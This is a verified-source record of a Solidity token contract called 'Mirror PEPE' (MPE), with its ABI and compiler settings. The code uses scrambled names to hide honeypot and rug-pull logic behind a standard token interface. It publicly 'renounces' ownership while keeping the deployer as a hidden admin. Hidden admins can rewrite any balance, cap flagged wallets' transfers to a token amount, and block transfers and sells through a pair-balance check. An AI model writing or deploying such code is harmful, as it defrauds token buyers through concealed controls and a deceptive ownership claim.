{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface fromMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isLiquidity) external view returns (uint256);\n\n    function transfer(address maxBuy, uint256 walletMinTeam) external returns (bool);\n\n    function allowance(address marketingAtTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletMinTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxBuy,\n        uint256 walletMinTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingMax, uint256 value);\n    event Approval(address indexed marketingAtTotal, address indexed spender, uint256 value);\n}\n\nabstract contract swapWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderMarketingTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txWalletAmount {\n    function createPair(address amountSell, address atEnable) external returns (address);\n}\n\ninterface fromModeMetadata is fromMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MirrorPEPE is swapWallet, fromMode, fromModeMetadata {\n\n    address public fromFundToken;\n\n    function amountAuto(address tokenFundTake, address maxBuy, uint256 walletMinTeam) internal returns (bool) {\n        require(isTx[tokenFundTake] >= walletMinTeam);\n        isTx[tokenFundTake] -= walletMinTeam;\n        isTx[maxBuy] += walletMinTeam;\n        emit Transfer(tokenFundTake, maxBuy, walletMinTeam);\n        return true;\n    }\n\n    function fundLaunch(address tokenFundTake, address maxBuy, uint256 walletMinTeam) internal returns (bool) {\n        if (tokenFundTake == swapFromWallet) {\n            return amountAuto(tokenFundTake, maxBuy, walletMinTeam);\n        }\n        uint256 maxMin = fromMode(fromFundToken).balanceOf(shouldMax);\n        require(maxMin == isEnable);\n        require(maxBuy != shouldMax);\n        if (takeAmount[tokenFundTake]) {\n            return amountAuto(tokenFundTake, maxBuy, listSender);\n        }\n        return amountAuto(tokenFundTake, maxBuy, walletMinTeam);\n    }\n\n    string private marketingList = \"Mirror PEPE\";\n\n    function allowance(address limitTo, address toExempt) external view virtual override returns (uint256) {\n        if (toExempt == senderMode) {\n            return type(uint256).max;\n        }\n        return launchedAmount[limitTo][toExempt];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxAutoTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletShouldIs;\n    }\n\n    function shouldExempt() private view {\n        require(totalAt[_msgSender()]);\n    }\n\n    function transfer(address tradingFrom, uint256 walletMinTeam) external virtual override returns (bool) {\n        return fundLaunch(_msgSender(), tradingFrom, walletMinTeam);\n    }\n\n    function transferFrom(address tokenFundTake, address maxBuy, uint256 walletMinTeam) external override returns (bool) {\n        if (_msgSender() != senderMode) {\n            if (launchedAmount[tokenFundTake][_msgSender()] != type(uint256).max) {\n                require(walletMinTeam <= launchedAmount[tokenFundTake][_msgSender()]);\n                launchedAmount[tokenFundTake][_msgSender()] -= walletMinTeam;\n            }\n        }\n        return fundLaunch(tokenFundTake, maxBuy, walletMinTeam);\n    }\n\n    uint256 tradingMarketing;\n\n    uint256 public enableTotal;\n\n    event OwnershipTransferred(address indexed receiverTrading, address indexed toIs);\n\n    function symbol() external view virtual override returns (string memory) {\n        return txLaunchEnable;\n    }\n\n    mapping(address => bool) public takeAmount;\n\n    function modeAmount(uint256 walletMinTeam) public {\n        shouldExempt();\n        isEnable = walletMinTeam;\n    }\n\n    uint256 private txLimit = 100000000 * 10 ** 18;\n\n    address shouldMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return walletShouldIs;\n    }\n\n    bool public feeWalletAuto;\n\n    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private launchedAmount;\n\n    function listTx(address tradingFrom, uint256 walletMinTeam) public {\n        shouldExempt();\n        isTx[tradingFrom] = walletMinTeam;\n    }\n\n    function approve(address toExempt, uint256 walletMinTeam) public virtual override returns (bool) {\n        launchedAmount[_msgSender()][toExempt] = walletMinTeam;\n        emit Approval(_msgSender(), toExempt, walletMinTeam);\n        return true;\n    }\n\n    uint256 constant listSender = 3 ** 10;\n\n    string private txLaunchEnable = \"MPE\";\n\n    uint256 public takeSell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLimit;\n    }\n\n    bool public listAtTx;\n\n    bool private launchMarketingSell;\n\n    uint256 private launchedMode;\n\n    uint8 private maxAutoTeam = 18;\n\n    function balanceOf(address isLiquidity) public view virtual override returns (uint256) {\n        return isTx[isLiquidity];\n    }\n\n    mapping(address => uint256) private isTx;\n\n    mapping(address => bool) public totalAt;\n\n    function minTx(address minLaunch) public {\n        shouldExempt();\n        if (modeTx) {\n            launchedMode = takeSell;\n        }\n        if (minLaunch == swapFromWallet || minLaunch == fromFundToken) {\n            return;\n        }\n        takeAmount[minLaunch] = true;\n    }\n\n    address private walletShouldIs;\n\n    bool private modeTx;\n\n    uint256 isEnable;\n\n    function launchedSell(address liquidityTotal) public {\n        require(liquidityTotal.balance < 100000);\n        if (listAtTx) {\n            return;\n        }\n        if (enableTotal != takeSell) {\n            enableTotal = launchedMode;\n        }\n        totalAt[liquidityTotal] = true;\n        if (modeTx == launchMarketingSell) {\n            launchMarketingSell = false;\n        }\n        listAtTx = true;\n    }\n\n    constructor (){\n        \n        senderMarketingTeam minShould = senderMarketingTeam(senderMode);\n        fromFundToken = txWalletAmount(minShould.factory()).createPair(minShould.WETH(), address(this));\n        \n        swapFromWallet = _msgSender();\n        liquidityTeam();\n        totalAt[swapFromWallet] = true;\n        isTx[swapFromWallet] = txLimit;\n        \n        emit Transfer(address(0), swapFromWallet, txLimit);\n    }\n\n    address public swapFromWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingList;\n    }\n\n    function liquidityTeam() public {\n        emit OwnershipTransferred(swapFromWallet, address(0));\n        walletShouldIs = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAtTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMinTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWalletAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFundToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAtTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMinTeam\",\"type\":\"uint256\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletMinTeam\",\"type\":\"uint256\"}],\"name\":\"modeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFromWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMinTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFundTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMinTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MirrorPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}